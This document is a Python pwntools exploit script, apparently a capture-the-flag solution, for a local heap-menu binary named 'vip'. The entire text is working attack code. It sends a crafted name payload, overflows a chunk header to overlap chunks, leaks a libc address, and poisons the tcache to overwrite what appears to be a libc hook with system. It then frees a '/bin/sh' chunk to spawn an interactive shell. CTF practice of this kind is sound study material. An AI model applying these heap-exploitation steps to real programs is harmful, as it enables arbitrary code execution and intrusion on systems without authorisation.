from pwn import *
context.log_level = 'debug'
def add(index):
	p.sendlineafter(": ","1")
	p.sendlineafter(": ",str(index))


def delete(index):
	p.sendlineafter(": ","3")
	p.sendlineafter(": ",str(index))


def edit(index,size,note):
	p.sendlineafter(": ","4")
	p.sendlineafter(": ",str(index))
	p.sendlineafter("Size: ",str(size))
	p.sendafter(": ",note)


def show(index):
	p.sendlineafter(": ","2")
	p.sendlineafter(": ",str(index))


p=process('./vip')
payload = "\x00\x00\x00\x18\x00\x00\x00\x00\x00\x00\xFF\xFF\x00\x00\x15\x00\x01\x00~\x00\x00\x06\x00\x00\x00\x00\x00\xFF\x7F\x06\x00\x00\x00\x00\x00\x05\x00"
p.sendlineafter(": ","6")
p.sendafter("name: \n","a"*0x20+payload)
add(0)
add(1)
add(5)
for i in range(20):
	add(2)

edit(0,0x80,"a"*0x10*5+p64(0)+p64(0x60*16+1))
delete(1)
add(3)
show(3)
libc_addr = u64(p.recv(6) + "\x00\x00")-0x7fc35edea110+0x7fc35e9fe000
print hex(libc_addr)
add(4)
add(6)
add(7)
add(8)
delete(6)
delete(7)
delete(8)
delete(4)
edit(5,16,p64(libc_addr+0x3ed8e8))
add(2)
add(2)
edit(2,16,p64(libc_addr + 0x4f440))
add(6)
edit(6,40,"/bin/sh\x00")
delete(6)
p.interactive()
